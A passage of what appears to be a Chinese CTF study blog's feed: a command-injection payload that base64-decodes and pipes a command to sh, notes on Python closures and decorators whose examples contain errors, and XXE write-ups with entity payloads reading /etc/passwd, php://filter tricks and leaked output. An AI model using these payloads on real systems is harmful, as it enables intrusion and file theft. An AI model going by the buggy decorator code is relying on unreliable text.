class="hljs-regexp">//</span>将flag.php进行base64编码，然后<span class="hljs-string">&#x27;bash&#x27;</span>指执行前面的echo脚本(和源码拼接起来)<br><span class="hljs-regexp">//</span>当然这里的bash被过滤了，但是用sh也是一样滴<br>?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-d|sh<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python闭包特性&amp;&amp;python函数装饰器</title>
    <link href="/2022/03/07/%E9%97%AD%E5%8C%85%E7%89%B9%E6%80%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E9%80%94-%E6%8A%84/"/>
    <url>/2022/03/07/%E9%97%AD%E5%8C%85%E7%89%B9%E6%80%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E7%94%A8%E9%80%94-%E6%8A%84/</url>
    
    <content type="html"><![CDATA[<p>学习中闭包的特性利用笔记&amp;&amp;python函数装饰器<br>本质是python的’一切皆对象’(雾)</p><h1 id="闭包的特性利用"><a href="#闭包的特性利用" class="headerlink" title="闭包的特性利用"></a>闭包的特性利用</h1><p>闭包的1个重要特性是:  python里嵌套函数阔以记得使用过的外部函数<br>甚么意思捏?<br>eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bar</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dick&quot;</span>)<br>    <span class="hljs-keyword">return</span> bar  <span class="hljs-comment">#这里是return bar而8是return bar()</span><br>a=foo()<br>a()<br></code></pre></td></tr></table></figure><p>结果:</p><blockquote><blockquote><blockquote><p>dick</p></blockquote></blockquote></blockquote><p>上述代码函数内写了个函数bar(), 并把bar()函数作为1个变量返回(因为py中，函数和变量等价，等价，等价)</p><p>而在此介绍py闭包的一个特性:嵌套函数会记住使用过的外部变量</p><p>eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params">e</span>):<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> bar<br><br>a=foo(<span class="hljs-string">&quot;shit&quot;</span>)<br>a()<br></code></pre></td></tr></table></figure><p>结果:</p><blockquote><blockquote><blockquote><p>shit</p></blockquote></blockquote></blockquote><p>上述代码和python的特性8符合，当return bar之后，e作为局部变量会被销毁，但是结果却成功输出了，这就因为python的另一个特性: 嵌套函数会记住使用过的外部变量(局部变量销毁后仍会被嵌套函数记住)</p><p>所以这个特性有毛用呢？</p><h2 id="用来生成8同函数"><a href="#用来生成8同函数" class="headerlink" title="用来生成8同函数"></a>用来生成8同函数</h2><p>eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">e1</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bar</span>(<span class="hljs-params">e2</span>):<br>        <span class="hljs-keyword">return</span> e1+e2<br>    <span class="hljs-keyword">return</span> bar<br><br>a=foo(<span class="hljs-number">100</span>)<br>a(<span class="hljs-number">200</span>)<br></code></pre></td></tr></table></figure><p>result:</p><blockquote><blockquote><blockquote><p>300<br>上述例子就可以利用该特性批量生成8同函数</p></blockquote></blockquote></blockquote><p>还有什么用呢?好像没了</p><h2 id="可以取代生成全局变量"><a href="#可以取代生成全局变量" class="headerlink" title="可以取代生成全局变量"></a>可以取代生成全局变量</h2><p>eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">x</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">y</span>(<span class="hljs-params">a,b</span>):<br>        <span class="hljs-built_in">print</span>(a,b)<br>    <span class="hljs-keyword">return</span> y<br></code></pre></td></tr></table></figure><h1 id="函数装饰器"><a href="#函数装饰器" class="headerlink" title="函数装饰器"></a>函数装饰器</h1><p>装饰器本质是函数或者类，他的作用是: 为原来的函数增加新的功能。装饰，顾名思义，就是在事物8变的基础上实现一些扩展</p><p>应用场景: 某天，你用python写了1堆函数，然后你突然想为这些函数加1个相同的功能，比如print(“d1ck”)，那么1个1个改就很麻烦，那么装饰器就派上了用场~</p><p>eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;abc&quot;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch4nge_func</span>(<span class="hljs-params">func1</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>(<span class="hljs-params">func1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d3f&quot;</span>)<br>        <span class="hljs-keyword">return</span> func1<br>    <span class="hljs-keyword">return</span> func2<br><br>f00=ch4nge_func(func1)<br>f00()<br></code></pre></td></tr></table></figure><p>结果:<br>    &gt;&gt;&gt;abc<br>    &gt;&gt;&gt;d3f</p><p>这个函数我没看懂….感觉有点毛病(它func2返回的8还是原来的func1吗?)，但是8太要紧，反正只要知道装饰器大致都是这么写的就好了，然后这样做也实现了修改函数的功能</p><p>然后研究了1下，把这认为是装饰器的1种新姿势吧….上面代码定义ch4nge_func里把return func1换成func1()，结果也还是一样的</p><p>然后写完了ch4nge_func后，再进行调用就阔以实现修改函数的目的啦，有2种调用方式，1种是func2&#x3D;ch4nge_func(func1)就改成了新函数(若8想新生成函数也可func1&#x3D;ch4nge_func(func1))；还有1种那就是用python的语法糖，比如上述代码用语法糖简化就是: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch4nge_func</span>(<span class="hljs-params">func1</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>(<span class="hljs-params">func1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d3f&quot;</span>)<br>        <span class="hljs-keyword">return</span> func1<br>    <span class="hljs-keyword">return</span> func2<br><span class="hljs-meta">@ch4nge_func</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func1</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;abc&quot;</span>)<br><span class="hljs-comment">#这里的@ch4nge_func等价于----func1=ch4nge_func(func1)</span><br></code></pre></td></tr></table></figure><p>再深入学习一下，了解一下装饰器的另1特性</p><h2 id="装饰器修改函数后改变了原函数名字-functools-wraps"><a href="#装饰器修改函数后改变了原函数名字-functools-wraps" class="headerlink" title="装饰器修改函数后改变了原函数名字: functools.wraps"></a>装饰器修改函数后改变了原函数名字: functools.wraps</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">abc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4bc&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch4nge_func</span>(<span class="hljs-params">func1</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d3f&quot;</span>)<br>        func1()<br>    <span class="hljs-keyword">return</span> func2<br><br>abc=ch4nge_func(abc)<br><span class="hljs-built_in">print</span>(abc.__name__)<br></code></pre></td></tr></table></figure><p>运行结果:<br>    &gt;&gt;&gt;func2</p><p>然而你想的打印结果应该是 abc 对8对? 这是因为func2重写了func1和其注释文档，多数情况下无伤大雅，如果你想保持原状，只要用到functools库里的wraps函数就阔以了</p><p>在定义装饰器函数时第一行顺便写入@wraps(‘你传入的func’)就阔以了，eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> fuctools<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ch4nge</span>(<span class="hljs-params">func1</span>):<br><span class="hljs-meta">    @wraps(<span class="hljs-params">fucn1</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">func2</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;FuuuuuuuuuuuCk&quot;</span>)<br>        <span class="hljs-keyword">return</span> func1<br>    <span class="hljs-keyword">return</span> func2()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">abc</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4bc&quot;</span>)<br>abc=ch4nge(abc)<br><span class="hljs-built_in">print</span>(abc.__name__)<br><br></code></pre></td></tr></table></figure><p>结果: &gt;&gt;&gt;abc</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><p>在web中检查某用户是否有权限访问web某页面: 没看懂，就8贴源码了<br>总之原理先搞懂，应用以后应该会用得上的(咕)</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxe攻击(2)</title>
    <link href="/2022/02/11/xxe%E6%94%BB%E5%87%BB(2)/"/>
    <url>/2022/02/11/xxe%E6%94%BB%E5%87%BB(2)/</url>
    
    <content type="html"><![CDATA[<p>顺便记录一下常用的linux文件路径，以便抄作业</p><p>开始实战, 2_n3ed_p00000000000000000000000w3r!!!!!!!!!!!!!!!!!!!!!</p><h1 id="fake-xml-NCTF"><a href="#fake-xml-NCTF" class="headerlink" title="fake_xml NCTF"></a>fake_xml NCTF</h1><p>这道题是假的xxe攻击题，flag在页面就能找到，实际上用来熟悉一下操作</p><p>常用php伪协议:<br>file:&#x2F;&#x2F; — 访问本地文件系统<br>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址<br>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs<br>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）<br>zlib:&#x2F;&#x2F; — 压缩流<br>data:&#x2F;&#x2F; — 数据（RFC 2397）<br>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式<br>phar:&#x2F;&#x2F; — PHP 归档<br>ssh2:&#x2F;&#x2F; — Secure Shell 2<br>rar:&#x2F;&#x2F; — RAR<br>ogg:&#x2F;&#x2F; — 音频流<br>expect:&#x2F;&#x2F; — 处理交互式的流</p><p>(目前会用的也8多，只有file:&#x2F;&#x2F;和php:&#x2F;&#x2F;，以后慢慢填)<br>data:&#x2F;&#x2F;: 写入协议，比如创建text文件并向text文件写入welecome to the zjctf<br>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p><p>首先，进入网页是个登陆界面，于是随便输，然后抓包，发现账户名和密码是以xml形式传输—-</p><p>于是就阔以进行构造payload: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后因为file:&#x2F;&#x2F; 读不出来，就用了php:&#x2F;&#x2F;filter过滤函数    —-基操<br>base64转码获得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//账号</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="hljs-comment">//密码</span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();   <span class="hljs-comment">//设立对象</span><br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);  <span class="hljs-comment">//8管了</span><br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);    <span class="hljs-comment">//simplexml_import_dom: 把节点转化为对象----</span><br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h1 id="more-linux下的-etc-passwd以及类似文件解释"><a href="#more-linux下的-etc-passwd以及类似文件解释" class="headerlink" title="more: linux下的&#x2F;etc&#x2F;passwd以及类似文件解释"></a>more: linux下的&#x2F;etc&#x2F;passwd以及类似文件解释</h1><p>在Linux &#x2F;etc&#x2F;passwd文件中每个用户都有一个对应的记录行，它记录了这个用户的一些基本属性。系统管理员经常会接触到这个文件的修改以完成对用户的管理工作。</p><p>哦，好了，我大致明白怎么工作了</p><p>类似还有etc&#x2F;hosts文件等<br>类似还有!! &#x2F;proc&#x2F;net&#x2F;arp  —-8知道啥用，可以获得ip，和hosts一样，好像是用来内网渗透的<br>&#x2F;proc&#x2F;net&#x2F;fib_trie<br>eg: 169.254.1.1</p><p>然后….<br>命令：SYSTEM “<a href="http://169.254.1.1或https//169.254.1.1">http://169.254.1.1或https://169.254.1.1</a>“</p><h1 id="payload作业"><a href="#payload作业" class="headerlink" title="payload作业"></a>payload作业</h1><p>放个典型:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br>php://filter/convert.base64-encode/resource=xxx.php<br></code></pre></td></tr></table></figure><h1 id="ture-xml-buuctf"><a href="#ture-xml-buuctf" class="headerlink" title="ture_xml(buuctf)"></a>ture_xml(buuctf)</h1><p>ok…….<br>首先进去是登陆界面，随便填，抓包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /doLogin.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">92</span>bc38a7-<span class="hljs-number">7117</span>-<span class="hljs-number">4470</span>-<span class="hljs-number">8</span>d20-<span class="hljs-number">7</span>e7633da6781.node4.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">97</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">97</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: application/xml, text/xml, */*; q=<span class="hljs-number">0</span>.<span class="hljs-number">01</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/xml;charset=utf-<span class="hljs-number">8</span><br><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">66</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">92</span>bc38a7-<span class="hljs-number">7117</span>-<span class="hljs-number">4470</span>-<span class="hljs-number">8</span>d20-<span class="hljs-number">7</span>e7633da6781.node4.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">92</span>bc38a7-<span class="hljs-number">7117</span>-<span class="hljs-number">4470</span>-<span class="hljs-number">8</span>d20-<span class="hljs-number">7</span>e7633da6781.node4.buuoj.cn:<span class="hljs-number">81</span>/<br><br><span class="hljs-section">&lt;user&gt;</span><span class="hljs-section">&lt;username&gt;</span><span class="hljs-attribute">admin</span>&lt;/username&gt;&lt;password&gt;<span class="hljs-number">123456</span>&lt;/password&gt;&lt;/user&gt;<br></code></pre></td></tr></table></figure><p>可以看到username和password都是用xml传的</p><p>所以就构造payload，直接抄作业</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p>回显成功:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>openresty<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sat, 19 Mar 2022 01:32:58 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>968<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.4.0RC6<br><br><span class="language-ruby">&lt;result&gt;&lt;code&gt;<span class="hljs-number">0</span>&lt;<span class="hljs-regexp">/code&gt;&lt;msg&gt;root:x:0:0:root:/root</span><span class="hljs-symbol">:/bin/bash</span></span><br><span class="language-ruby"><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span></span><br><span class="language-ruby"><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span></span><br><span class="language-ruby"><span 